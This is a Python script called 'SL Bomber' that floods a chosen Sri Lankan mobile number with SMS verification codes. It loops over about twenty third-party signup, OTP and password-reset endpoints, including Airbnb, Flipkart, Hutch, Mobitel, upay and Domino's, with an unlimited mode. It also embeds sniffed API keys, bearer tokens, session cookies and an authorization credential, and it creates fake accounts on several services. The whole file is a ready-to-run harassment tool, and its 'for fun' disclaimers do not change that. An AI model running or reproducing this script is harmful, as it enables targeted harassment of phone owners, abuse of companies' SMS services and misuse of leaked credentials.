#Script By Sandaru Ashen https://wa.me/16825007668
import os,random,time,sys
from urllib import request
os.system('clear')
fore=['\x1b[91m','\x1b[34m','\x1b[36m','\x1b[93m','\x1b[32m','\x1b[35m','\x1b[31m','\x1b[94m','\x1b[96m','\x1b[92m','\x1b[33m','\x1b[95m']
logo=f'{random.choice(fore)}\x1b[1m\t\t   _________.__\n                  /   _____/|  |\n                  \\_____  \\ |  |\n                  /        \\|  |__\n                 /_______  /|____/\n   __________            \\/___.\n   \\______   \\ ____   _____\\_ |__   ___________\n    |    |  _//  _ \\ /     \\| __ \\_/ __ \\_  __ \\\n    |    |   (  <_> )  Y Y  \\ \\_\\ \\  ___/|  | \\/\n    |______  /\\____/|__|_|  /___  /\\___  >__|\n           \\/             \\/    \\/     \\/ {random.choice(fore)}v.1.3\n\t\t{random.choice(fore)}[+] By Sandaru Ashen'
bar=f'{random.choice(fore)}\x1b[1m_________________________{random.choice(fore)}_________________________\x1b[0m'
print(bar+'\n')
print(logo)
print(bar+'\n')
time.sleep(0.3)
print(f'\x1b[1m\t\t\x1b[92m1.Start SL Bomber\n\t\t\x1b[93m2.About\n\t\t\x1b[91m3.Exit')
try:
	from requests import post,get;from colorama import Fore,init,Style
except ModuleNotFoundError:
	print('\x1b[91m[!] Required Modules Aren\'t Installed!')
	time.sleep(1)
	print('\x1b[34m[*] Installing...')
	os.system('pip3 install requests colorama')
	print('\x1b[92m[+] Required Modules Installed!')
	os.system('clear')
	from requests import post,get
	from colorama import Fore,init,Style
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	print(f'\x1b[1m\t\t\x1b[92m1.Start SL Bomber\n\t\t\x1b[93m2.About\n\t\t\x1b[91m3.Exit')
init(autoreset=True)
def prsent(count,num):
	sys.stdout.write('\r' +random.choice(fore) +Style.BRIGHT+'\t[*]'+' Bombing '+str(num)+'\t'+str(count)+' Sent')
	sys.stdout.flush()
def Spinner():
	l=['|','/','-','\\']
	for i in l+l+l:
		sys.stdout.write('\r'+Style.BRIGHT+Fore.LIGHTYELLOW_EX+'[*] Checking Your Internet Connection  '+i)
		sys.stdout.flush()
		time.sleep(0.2)
time.sleep(0.3)
while True:
	try:
		cho=int(input(Fore.LIGHTCYAN_EX+Style.BRIGHT+'Enter Your Choice: '))
		if cho > 0 and cho <4:
			break
		else:
			Print(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Please Enter A Correct Choice!')
	except:
			print(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Incorrect Choice')
if cho==1:
	time.sleep(0.4)
	os.system('clear')
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	try:
		Spinner()
		request.urlopen('https://httpbin.org/get')
		print(Fore.LIGHTGREEN_EX+Style.BRIGHT+'\n[+] Connection Successful!')
		time.sleep(1.5)
		os.system('clear')
		print(bar+'\n')
		print(logo)
		print(bar+'\n')
	except:
		time.sleep(0.4)
		print(Fore.LIGHTRED_EX+Style.BRIGHT+'\n[!] You Aren\'t Connected To Internet!')
		time.sleep(0.3)
		print(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Please Connect To Internet To Continue...')
		time.sleep(0.3)
		input(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Exiting...\nPress Enter To Continue...')
		exit()
	while True:
		try:
			num=int(input(Style.BRIGHT+'Enter The Target No(07xxxxxxxx): '))
			num='0'+str(num)
			if len(num) == 10 and str(num)[0:3] in ('070','071','072','075','076','077','078'):
				break
			else:
				print(Fore.LIGHTRED_EX + 'Please Enter A Correct Number!')
				continue
		except ValueError:
			print(Fore.LIGHTRED_EX + 'Please Enter A Phone Number Not Letters!')
			continue
	def yogo(num,delay):
		url='http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
		body={'countrycode':'94','mobile':num,'name':'santha','email':''}
		po=post(url,data=body)
		time.sleep(delay)
	def mega(num,delay):
		url='https://megarun.dialog.lk/api/v2/user'
		body={'mobile':num[1:]}
		po=post(url,data=body)
		time.sleep(delay)
	def guru(num,delay):
		url='https://guru.lk/auth/headstart/ajax.php'
		body={'phone':num,'course':'1','sesskey':'','action':'sms_reg'}
		po=post(url,data=body)
		time.sleep(delay)
	def slmat(num,delay):
		url='https://www.srilankanmatrimony.com/api/1/6'
		headers={'Authorization':'Basic YWRtaW46bFJxVzZXTlQ=','Content-Type':'application/x-www-form-urlencoded','Host':'www.srilankanmatrimony.com'}
		data={'Module':'','MatriId':'LKA841313','PackageName':'com.srilankanmatrimony','AppVersionCode':'148','SignalStrength':'','AppVersion':'6.0','EncryptId':'58ceb12be79bde7e7a1b8ca366823fad099ba147','Referrer':'Page3','NetworkType':'WIFI','UniqueId':'','mima':'yes','DeviceVersion':'5.1','DeviceModel':'HUAWEI%20LUA-U22','contactdet':f'%7B%22PriMobileCountryCode%22%3A%22%2B94%22%2C%22PriMobileNo%22%3A%22{num[1:]}%22%2C%22MatriId%22%3A%22LKA841313%22%7D','DevicePlatform':'Android','OutputType':'2','CommunityId':'2007','AppType':'102','CarrierName':'','Gender':'1'}
		po=post(url,headers=headers,data=data)
		time.sleep(delay)
	def kangaroo(num,delay):
		url='https://customer.kangarooapps.com/customer-api/customers/create'
		body={'email':'a1@slt.net','firstName':'A','lastName':'b','password':'abcd1234','contactNumber':num[1:],'countryCode':'+94'}
		crereq=post(url,data=body)
		url='https://customer.kangarooapps.com/customer-api/customers/password/forgot'
		body={'contactNumber':num,'countryCode':'+94'}
		po=post(url,data=body)
		time.sleep(delay)
	def dtamart(num,delay):
		url='https://www.datamart.lk/home/otpForViewUsage'
		body={'serviceNum':num}
		po=post(url,data=body)
		time.sleep(delay)
	def dtamart2(num,delay):
		def precon(num):
			url='https://www.datamart.lk/home/actPreConfirm'
			headers={'Host':'www.datamart.lk','Content-Type':'application/x-www-form-urlencoded'}
			cookies=dict(JSESSIONID='y8XRkErbp8P8cyqW3RXrMM7W',_ga='GA1.2.1867291426.1595041842',_gid='GA1.2.779901286.1595041842',_gat_gtag_UA_126914918_1='1')
			body=dict(serviceNumber=num,reServiceNumber=num,selector117='a',paymentMethod='a',packageRefNo='117')
			po=post(url,headers=headers,cookies=cookies,data=body)
		def sms():
			url='https://www.datamart.lk/home/payPrePkg'
			headers={'Host':'www.datamart.lk','Content-Type':'application/x-www-form-urlencoded'}
			cookies=dict(JSESSIONID='y8XRkErbp8P8cyqW3RXrMM7W',_ga='GA1.2.1867291426.1595041842',_gid='GA1.2.779901286.1595041842',_gat_gtag_UA_126914918_1='1')
			po=post(url,headers=headers,cookies=cookies)
			return po.text
		precon(num)
		res=sms()
		time.sleep(delay)
	def doc(num,delay):
		url='https://mobile.doc.lk/user-register/send-sms'
		head={'Host':'mobile.doc.lk','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
		body={'formId':'469738','country':'1','phone':num,'email':'','_token':'JnkhHDk6zEg3jtnWhz1rI0z2ETGtcsXW4TdtoiVy'}
		req=post(url,headers=head,data=body)
		time.sleep(delay)
	def pat(num,delay):
		url='https://www.patpat.lk/api/customer.php'
		para={'customer':'new_customer'}
		head={'Host':'www.patpat.lk'}
		body={'title':'Mr.','first_name':'ගලපිටමඩ ආරච්චිලාගේ සාන්ත','last_name':'සාන්ත ගලේගොඩ','email':'s1@l.lk','password':'MTIzNDU2Nw==','telephone':num,'gender':'','dob':'1976-08-24'}
		po=post(url,params=para,headers=head,json=body)
		time.sleep(delay)
	def ona(num,delay):
		url='https://cognito-idp.ap-southeast-1.amazonaws.com/'
		head={'x-amz-target':'AWSCognitoIdentityProviderService.InitiateAuth','Content-Type':'application/x-amz-json-1.1','Host':'cognito-idp.ap-southeast-1.amazonaws.com'}
		body={'AuthFlow':'CUSTOM_AUTH','ClientId':'uv3fuaop27riqv417pgivo447','AuthParameters':{'USERNAME':'+94'+num[1:]},'ClientMetadata':{}}
		def mkacc(num):
			url='https://cognito-idp.ap-southeast-1.amazonaws.com/'
			head={'x-amz-target':'AWSCognitoIdentityProviderService.SignUp','Content-Type':'application/x-amz-json-1.1','Host':'cognito-idp.ap-southeast-1.amazonaws.com'}
			json={"ClientId":"uv3fuaop27riqv417pgivo447","Username":"+94"+num[1:],"Password":"123456","UserAttributes":[{"Name":"name","Value":"abc"}],"ValidationData":[]}
			post(url,headers=head,json=json)
		po=post(url,headers=head,json=body)
		time.sleep(delay)
	def idea(num,delay):
		url='https://portal.ideabiz.lk/v2/user/otpRequest'
		head={'Host':'portal.ideabiz.lk'}
		body={"method":"ANC","msisdn":"94"+num[1:]}
		po=post(url,headers=head,json=body)
		time.sleep(delay)
	def airbnb(num,delay):
		url='https://www.airbnb.com/api/v2/phone_one_time_passwords'
		headers=dict(Host='www.airbnb.com')
		params=dict(currency='USD',key='d306zoyjsyarp7ifhu67rjxn52tv0t20',locale='en')
		num='94'+num
		data=dict(phoneNumber=num,workFlow='GLOBAL_SIGNUP_LOGIN',otpMethod='AUTO')
		po=post(url,params=params,headers=headers,json=data)
		time.sleep(delay)
	def mobself(num,delay):
		url='https://mdp.mobitel.lk/mfp/api/adapters/SelfCareAdapter/account/addNumberToApp'
		header={'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjRkZTNlODQ1LTAwMDctNDVkYy04ZjhhLWYzYzM5Y2QyMDE2YiIsIm4iOiJBTTBEZDd4QWR2NkgteWdMN3I4cUNMZEUtM0kya2s0NXpnWnREZF9xczhmdm5ZZmRpcVRTVjRfMnQ2T0dHOENWNUNlNDFQTXBJd21MNDEwWDlJWm52aHhvWWlGY01TYU9lSXFvZS1ySkEwdVp1dzJySGhYWjNXVkNlS2V6UlZjQ09Zc1FOLW1RSzBtZno1XzNvLWV2MFVZd1hrU093QkJsMUVocUl3VkR3T2llZzJKTUdsMEVYc1BaZmtOWkktSFU0b01paS1Uck5MelJXa01tTHZtMDloTDV6b3NVTkExNXZlQ0twaDJXcG1TbTJTNjFuRGhIN2dMRW95bURuVEVqUFk1QW9oMmluSS0zNlJHWVZNVVViTzQ2Q3JOVVl1SW9iT2lYbEx6QklodUlDcGZWZHhUX3g3c3RLWDVDOUJmTVRCNEdrT0hQNWNVdjdOejFkRGhJUHU4PSJ9fQ.eyJpc3MiOiJjb20uaWJtLm1mcCIsInN1YiI6IjRkZTNlODQ1LTAwMDctNDVkYy04ZjhhLWYzYzM5Y2QyMDE2YiIsImF1ZCI6ImNvbS5pYm0ubWZwIiwiZXhwIjoxNTk2MzQxMjUyNzY2LCJzY29wZSI6IlJlZ2lzdGVyZWRDbGllbnQgU2VsZkNhcmVTY29wZSJ9.s8wa0ga9uNVPyswtgsOhLnFUrEffSEOFuJ9X6uRPg-QSJKK16BI-QZA7yX6n1QDiSyssZmD_kczgIpGgeguQ2ulgi3r7ymxvf7QmAaXdDVXb2EVD_B7GZls1w8uZmrh6h07OkZIH6nEDDYapqcIEuJXPlNbUGUy5rgAnZcYSQ_-8PKMQoiYWG_RHeOaCmA5aiwEuqRWbIk-QO3x8BJ_rQ5DlnG20XOHttYnW2YgniQsWLr2dagM_Oe7CX7NMADjxxHh9XwTUkrqbtIqPZGnSVFb_sxkdvYWyoptDxGo4iamXfXmBi1ol0wDqm81CxmW-h9ql5QJzsQ2_WjIG8OZeRQ', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'mdp.mobitel.lk'}
		data=f'params=%5B%7B%22device_type%22%3A%22desktop%22%2C%22appType%22%3A%22android%22%2C%22platformName%22%3A%22Android%22%2C%22user_id%22%3A%22-%22%2C%22testMode%22%3Afalse%2C%22trn_id%22%3A6%2C%22controller%22%3A%22account%22%2C%22action%22%3A%22addNumberToApp%22%2C%22platformVersion%22%3A%2210%22%2C%22device_version%22%3A%2210%22%2C%22device_manufacturer%22%3A%22HMD%20Global%22%2C%22deviceRef%22%3A%2204ff7be9ec7d63ba_381596262673267%22%2C%22device_id%22%3A%2204ff7be9ec7d63ba%22%2C%22device_platform%22%3A%2210%22%2C%22device_imsi%22%3A%2204ff7be9ec7d63ba%22%2C%22deviceModel%22%3A%22WSP_sprout%22%2C%22deviceToken%22%3A%22x2kmc48jb6g24147w817et6a19.769369435a%22%2C%22appVersion%22%3A%223.0.2%22%2C%22prePostType%22%3A%22%22%2C%22conn%22%3A%22%22%2C%22language%22%3A%22en%22%2C%22primaryConn%22%3A%22%22%2C%22user_type%22%3A%22%22%2C%22session_key%22%3A%22%22%2C%22package%22%3A%22%22%2C%22network_type%22%3A%22cellular%22%2C%22lob%22%3A%22%22%2C%22pushID%22%3A%22fv_AAyv6i9g%3AAPA91bFir7VaQDLBuSgSW8AQRZ8wVX78ZbGanuKIEDM0zrPhUrYiU62disk6k1jL242HQs6RPCLCmeIzNStQ30JZk7d7wGYVGZANWA74ceoui5d-PaeeNoFhnrzopSbQTs7EbaqjncfR%22%2C%22mobileNumber%22%3A%22{num}%22%7D%5D'
		po=post(url,headers=header,data=data)
		time.sleep(delay)
	def flipkrt(num,delay):
		url='https://rome.api.flipkart.net/1/action/view'
		headers={'Host':'rome.api.flipkart.net','secureToken':'RNsqo12ukbfrmpJgIGzjV4PzGrCABA+Jge5SavXmgUOmlVF7pEaMjDPYkZUiLSdHwaDRcnAmjwXyj7lZpNtsVg==','X-User-Agent':'Mozilla/5.0 (Linux; Android 10; Nokia 2.2 Build/QP1A.190711.020) FKUA/Retail/1140010/Android/Mobile (HMD Global/Nokia 2.2/08f43819400267ace00706df3429a61c)','Accept-Encoding':'gzip'}
		json={'actionRequestContext':{'type':'LOGIN_IDENTITY_VERIFY','loginId':num,'loginIdPrefix':'+94','phoneNumberFormat':'E164','addAppHash':True,'loginType':'MOBILE','verificationType':'OTP','sourceContext':'MY_ACCOUNT','clientQueryParamMap':None}}
		po=post(url,headers=headers,json=json)
		time.sleep(delay)
	def hutcliq(num,delay):
		url='https://cliq.hutch.lk/api/services/auth/v1/login/smscode'
		params={'prefix':'94','sdn':num[1:]}
		head={'Host':'cliq.hutch.lk','Accept-Encoding':'gzip'}
		po=get(url,params=params,headers=head)
		time.sleep(delay)
	def hutself(num,delay):
		url='https://oneapp.hutch.lk/hutch_1_0/index.php'
		params={'r':'/scapp/account/sendOTP'}
		head={'Host':'oneapp.hutch.lk','Content-Length':'152','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
		body={'appType':'android','appVersion':'2.0.1','conn':num[1:],'deviceModel':'Nokia+2.2','deviceRef':'68e6a23f3b598e32','deviceVersion':'10','language':'en','lob':'mobile','prePostType':'pre'}
		po=post(url,params=params,headers=head,data=body)
		time.sleep(delay)
	def nanasa(num,delay):
		url='http://internal-nenasa.dialog.lk/api/mobile/v1/pin'
		header={'Content-Type':'application/json','Host':'internal-nenasa.dialog.lk'}
		body={'number':num,'type':'ANDROID'}
		po=post(url,headers=header,json=body)
		time.sleep(delay)
	def sing(num,delay):
		url='https://apps.appmaker.lk/ideabiz/subscribePin'
		head={'Host':'apps.appmaker.lk'}
		body={'appId':'5ddd5cf840471839fef5125f','uuId':'04ff7be9ec7d63ba','msisdn': '94'+num[1:]}
		po=post(url,headers=head,json=body)
		time.sleep(delay)
	def savari(num,delay):
		url='https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
		body={'email':'a1@slt.net','numCountryCode':'+94','phoneNum':num[1:],'referralCode':'','userType':'passenger'}
		po=post(url,json=body)
		time.sleep(delay)
	def youcab(num,delay):
		url='http://youcab-apps.com/vconnect/passenger/v1/clientPinRequestData_droid.php'
		body={'countrycode':'%2B94','mobile':num,'name':'s','email':''}
		po=post(url,data=body)
		time.sleep(delay)
	def domin(num,delay):
		url='https://apis.dominoslk.com/loginhandler/forgotpassword'
		headers={'Host':'apis.dominoslk.com'}
		data={'lastName':'','mobile':num[1:],'firstName':''}
		po=post(url,headers=headers,json=data)
		time.sleep(delay)
	def upay(num,delay):
		def getid(num):
			url='https://apigateway.upay.lk/platform-service/customer/signup/heyu'
			headers={'Host':'apigateway.upay.lk','x-api-key':'IdHobBMY1q70qCMnWECcV1FZw6AVGnyH5pSTaHKa'}
			json={'name':'Santha','mobile':num,'username':'+94'+num,'countryCode':'+94','password':'1234','deviceInfo':{'deviceType':'MOBILE','deviceUUID':'68e6a23f3b598e32','deviceSerial':'nkonuwn','deviceModel':'Nokia 2.2','os':'Android','deviceManufacturer':'HMD Global','osVersion':'10','isVirtual':False},'termsAndConditionsVersionId':'2.0','privacyPolicyVersionId':'2.0','signUpReferrer':None}
			idreq=post(url,headers=headers,json=json)
			return idreq
		idreq=getid(num)
		def sms(idreq):
			url='https://apigateway.upay.lk/platform-service/otp/request'
			header={'Host':'apigateway.upay.lk','x-api-key':'IdHobBMY1q70qCMnWECcV1FZw6AVGnyH5pSTaHKa'}
			json={'otpType':'SIGNUP','notificationMedium':'MOBILE','userId':idreq.json()['data']['userId']}
			po=post(url,headers=header,json=json)
			idreq=getid(num)
			#sms(idreq)
		sms(idreq)
		time.sleep(delay)
	time.sleep(0.4)
	while True:
		times=input(Style.BRIGHT+Fore.LIGHTYELLOW_EX+'How Many Messages (U) To Unlimited:')
		if times.isnumeric() or times == 'U' or	times == 'u':
			break
		else:
			print(Style.BRIGHT+Fore.LIGHTRED_EX+'[!] Enter A Correct Amount Or \'U\' For Unlimited')
	time.sleep(0.4)
	while True:
		delay=input(Style.BRIGHT+Fore.LIGHTMAGENTA_EX+'Enter Delay Time (In Seconds)\n\t\t[Recomended 5]:')
		if delay.isnumeric() and int(delay) > 0:
			delay=float(delay)
			break
		elif delay=='0':
			print(Style.BRIGHT+Fore.LIGHTRED_EX+'[!] Value Must Be More Than 0')
		else:
			delay=5.0
			break
	os.system('clear')
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	time.sleep(0.5)
	print(f'\t{Style.BRIGHT}Use This For Fun, Not For Revenge !!\n\tSL Bomber Created By Sandaru Ashen\n\t     http://wa.me/16825007668')
	print(bar+'\n')
	print(Fore.YELLOW+Style.BRIGHT+'\tPress Ctrl+c To Terminate The Bombing')
	if num[0:3] == '077' or num[0:3] == '076':
		count=0
		if times.isnumeric():
			while count< int(times):
				mega(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					yogo(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						guru(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							pat(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								doc(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									idea(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										ona(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
											sing(num,delay)
											count+=1
											prsent(count,num)
											if count<int(times):
												kangaroo(num,delay)
												count+=1
												prsent(count,num)
												if count<int(times):
													airbnb(num,delay)
													count+=1
													prsent(count,num)
													if count<int(times):
														flipkrt(num,delay)
														count+=1
														prsent(count,num)
														if count<int(times):
															savari(num,delay)
															count+=1
															prsent(count,num)
															if count<int(times):
																youcab(num,delay)
																count+=1
																prsent(count,num)
																if count<int(times):
																	upay(num,delay)
																	count+=1
																	prsent(count,num)
																	if count<int(times):
																		nanasa(num,delay)
																		count+=1
																		prsent(count,num)
																		if count<int(times):
																			domin(num,delay)
																			count+=1
																			prsent(count,num)
																			if count< int(times):
																				slmat(num,delay)
																				count+=1
																				prsent(count,num)
		else:
			while True:
				mega(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
	elif num[0:3] == '071' or num[0:3] == '070':
		count=0
		if times.isnumeric():
			while count< int(times):
				dtamart(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					dtamart2(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						yogo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							guru(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								kangaroo(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									airbnb(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										pat(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
											doc(num,delay)
											count+=1
											prsent(count,num)
											if count<int(times):
												idea(num,delay)
												count+=1
												prsent(count,num)
												if count<int(times):
													ona(num,delay)
													count+=1
													prsent(count,num)
													if count<int(times):
														flipkrt(num,delay)
														count+=1
														prsent(count,num)
														if count<int(times):
															savari(num,delay)
															count+=1
															prsent(count,num)
															if count<int(times):
																sing(num,delay)
																count+=1
																prsent(count,num)
																if count<int(times):
																	youcab(num,delay)
																	count+=1
																	prsent(count,num)
																	if count<int(times):
																		upay(num,delay)
																		count+=1
																		prsent(count,num)
																		if count<int(times):
																			nanasa(num,delay)
																			count+=1
																			prsent(count,num)
																			if count<int(times):
																				domin(num,delay)
																				count+=1
																				prsent(count,num)
																				if count< int(times):
																					slmat(num,delay)
																					count+=1
																					prsent(count,num)
																					if count< int(times):
																						mobself(num,delay)
																						count+=1
																						prsent(count,num)
		else:
			while True:
				dtamart(num,delay)
				count+=1
				prsent(count,num)
				dtamart2(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				mobself(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
	elif num[0:3] == '078' or num[0:3] == '072':
		count=0
		if times.isnumeric():
			while count< int(times):
				hutcliq(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					hutself(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						yogo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							guru(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								kangaroo(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									pat(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										doc(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
										  sing(num,delay)
										  count+=1
										  prsent(count,num)
										  if count<int(times):
										  	idea(num,delay)
										  	count+=1
										  	prsent(count,num)
  											if count<int(times):
  												ona(num,delay)
  												count+=1
  												prsent(count,num)
  												if count<int(times):
  													airbnb(num,delay)
  													count+=1
  													prsent(count,num)
  													if count<int(times):
  														flipkrt(num,delay)
  														count+=1
  														prsent(count,num)
  														if count<int(times):
  															savari(num,delay)
  															count+=1
  															prsent(count,num)
  															if count<int(times):
  																youcab(num,delay)
  																count+=1
  																prsent(count,num)
  																if count<int(times):
  																	upay(num,delay)
  																	count+=1
  																	prsent(count,num)
  																	if count<int(times):
  																		nanasa(num,delay)
  																		count+=1
  																		prsent(count,num)
  																		if count<int(times):
  																			domin(num,delay)
  																			count+=1
  																			prsent(count,num)
  																			if count< int(times):
  																				slmat(num,delay)
  																				count+=1
  																				prsent(count,num)
		else:
			while True:
				hutcliq(num,delay)
				count+=1
				prsent(count,num)
				hutself(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
	elif num[0:3] == '075':
		count=0
		if times.isnumeric():
			while count< int(times):
				yogo(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					guru(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						kangaroo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							pat(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								doc(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									idea(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
									  sing(num,delay)
									  count+=1
									  prsent(count,num)
									  if count<int(times):
  										ona(num,delay)
  										count+=1
  										prsent(count,num)
  										if count<int(times):
  											airbnb(num,delay)
  											count+=1
  											prsent(count,num)
  											if count<int(times):
  												flipkrt(num,delay)
  												count+=1
  												prsent(count,num)
  												if count<int(times):
  													savari(num,delay)
  													count+=1
  													prsent(count,num)
  													if count<int(times):
  														youcab(num,delay)
  														count+=1
  														prsent(count,num)
  														if count<int(times):
  															upay(num,delay)
  															count+=1
  															prsent(count,num)
  															if count<int(times):
  																nanasa(num,delay)
  																count+=1
  																prsent(count,num)
  																if count<int(times):
  																	domin(num,delay)
  																	count+=1
  																	prsent(count,num)
  																	if count< int(times):
  																		slmat(num,delay)
  																		count+=1
  																		prsent(count,num)
		else:
			while True:
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
	print('\n'+bar+'\n')
	time.sleep(0.90)
	print(f'{Style.BRIGHT}{Fore.LIGHTGREEN_EX}\t[+] Bombing Successful')
	time.sleep(0.75)
	ag=input(f'\t{Style.BRIGHT}{random.choice(fore)}[?] Run The Bomber Again?(y/n) ')
	if ag == 'Y' or ag == 'y':
		os.system('python3 slbomber.py')
	else:
		exit()
elif cho == 2:
	os.system('clear')
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	print(f'{Style.BRIGHT}\t\t\tAbout\n{random.choice(fore)}[+] Special Thanks To Packet Sniffing Software\n{random.choice(fore)}[+] If You Have Any Complains Or Future Requests Contact Me @ http://wa.me/16825007668\n{random.choice(fore)}[+] Never Use The Script To Cause Harm/Discomfort/Trouble To Others\n{random.choice(fore)}[!] If You Know More Websites And Apps That Use SMS Verification Please Inform Me')
	input(f'{Style.BRIGHT}{random.choice(fore)}\t[+] Press ENTER To Go Back To Main Menu')
	os.system('python3 slbomber.py')
else:
	exit()
